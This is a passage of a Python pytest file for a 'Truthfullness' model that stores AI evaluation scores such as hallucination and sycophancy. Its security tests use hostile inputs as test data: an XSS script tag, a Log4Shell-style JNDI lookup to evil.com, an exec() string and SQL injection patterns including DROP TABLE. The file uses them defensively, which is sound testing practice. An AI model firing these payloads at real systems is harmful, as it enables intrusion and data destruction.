            "<script>alert('xss')</script>",
            "${jndi:ldap://evil.com/a}",
        ]
        
        for name in malicious_names:
            valid_truthfullness_data["model_name"] = name
            truthfullness = Truthfullness(**valid_truthfullness_data)
            # Should just store as string, not execute
            assert truthfullness.model_name == name
            assert isinstance(truthfullness.model_name, str)
    
    def test_no_code_injection_in_score_fields(self, valid_truthfullness_data):
        """Test that score fields with malicious strings are treated as strings"""
        valid_truthfullness_data["overall"] = "exec('malicious code')"
        
        truthfullness = Truthfullness(**valid_truthfullness_data)
        
        # Should just store as string, not execute
        assert truthfullness.overall == "exec('malicious code')"
        assert isinstance(truthfullness.overall, str)
    
    def test_sql_injection_patterns(self, valid_truthfullness_data):
        """Test various SQL injection patterns"""
        sql_patterns = [
            "1' OR '1'='1",
            "'; DROP TABLE users; --",
            "admin'--",
            "' UNION SELECT * FROM users--",
        ]
        
        for pattern in sql_patterns:
            valid_truthfullness_data["model_name"] = pattern
            truthfullness = Truthfullness(**valid_truthfullness_data)
            assert truthfullness.model_name == pattern


# ==================== SCALABILITY TESTS ====================

class TestTruthfullnessScalability:
    """Test scalability aspects"""
    
    def test_handle_multiple_instances(self, valid_truthfullness_data):
        """Test creating multiple Truthfullness instances"""
        instances = []
        
        for i in range(100):
            data = valid_truthfullness_data.copy()
            data["model_name"] = f"model-{i}"
            data["overall"] = f"0.{i:02d}"
            instances.append(Truthfullness(**data))
        
        assert len(instances) == 100
        assert instances[0].model_name == "model-0"
        assert instances[99].model_name == "model-99"
    
    def test_memory_efficiency_with_many_instances(self, valid_truthfullness_data):
        """Test memory efficiency with many instances"""
        instances = []
        
        for i in range(1000):
            data = valid_truthfullness_data.copy()
            data["model_name"] = f"model-{i}"
            instances.append(Truthfullness(**data))
        
        # All instances should be created successfully
        assert len(instances) == 1000
    
    def test_large_batch_serialization(self, valid_truthfullness_data):
        """Test serializing many instances"""
        instances = [Truthfullness(**valid_truthfullness_data) for _ in range(100)]
        
        serialized = [inst.model_dump() for inst in instances]
        
        assert len(serialized) == 100
        assert all(isinstance(item, dict) for item in serialized)


# ==================== FIELD-SPECIFIC TESTS ====================

class TestTruthfullnessFieldSpecific:
    """Test specific behaviors of individual fields"""
    
    def test_internal_vs_external_metrics(self, valid_truthfullness_data):
        """Test that internal and external metrics are independent"""
        valid_truthfullness_data["internal"] = "0.8"
        valid_truthfullness_data["external"] = "0.9"
        
        truthfullness = Truthfullness(**valid_truthfullness_data)
        
        # Internal and external should be different
        assert truthfullness.internal == "0.8"
        assert truthfullness.external == "0.9"
        assert truthfullness.internal != truthfullness.external
    
    def test_hallucination_detection_metric(self, valid_truthfullness_data):
        """Test hallucination field for detecting fabricated information"""
        valid_truthfullness_data["hallucination"] = "0.95"
        
        truthfullness = Truthfullness(**valid_truthfullness_data)
        
        assert truthfullness.hallucination == "0.95"
        assert isinstance(truthfullness.hallucination, str)
    
    def test_sycophancy_metrics_independence(self, valid_truthfullness_data):
        """Test that persona and preference sycophancy are independent"""
        valid_truthfullness_data["persona_sycophancy"] = "0.85"
        valid_truthfullness_data["preference_sycophancy"] = "0.75"
        
        truthfullness = Truthfullness(**valid_truthfullness_data)
        
        assert truthfullness.persona_sycophancy == "0.85"
        assert truthfullness.preference_sycophancy == "0.75"
        assert truthfullness.persona_sycophancy != truthfullness.preference_sycophancy
    
    def test_adversarial_factuality_metric(self, valid_truthfullness_data):
        """Test adv_factuality field for adversarial factuality testing"""
        valid_truthfullness_data["adv_factuality"] = "0.92"
        
        truthfullness = Truthfullness(**valid_truthfullness_data)
        
        assert truthfullness.adv_factuality == "0.92"
        assert isinstance(truthfullness.adv_factuality, str)
    
    def test_overall_vs_individual_scores(self, valid_truthfullness_data):
        """Test that overall score can differ from individual scores"""
        valid_truthfullness_data["internal"] = "0.5"
        valid_truthfullness_data["external"] = "0.8"
        valid_truthfullness_data["overall"] = "0.65"  # Aggregate
        
        truthfullness = Truthfullness(**valid_truthfullness_data)
        
        # Overall can be different from individual scores
        assert truthfullness.overall == "0.65"
        assert truthfullness.internal == "0.5"
    
    def test_inhouse_model_flag_independence(self, valid_truthfullness_data):
        """Test that inhouse_model flag doesn't affect score fields"""
        valid_truthfullness_data["inhouse_model"] = True
        truthfullness1 = Truthfullness(**valid_truthfullness_data)
        
        valid_truthfullness_data["inhouse_model"] = False
        truthfullness2 = Truthfullness(**valid_truthfullness_data)
        
        # Score fields should be same regardless of inhouse_model
        assert truthfullness1.overall == truthfullness2.overall
        assert truthfullness1.internal == truthfullness2.internal
        # But inhouse_model should differ
        assert truthfullness1.inhouse_model != truthfullness2.inhouse_model


if __name__ == '__main__':
    pytest.main([__file__, '-v', '--tb=short'])
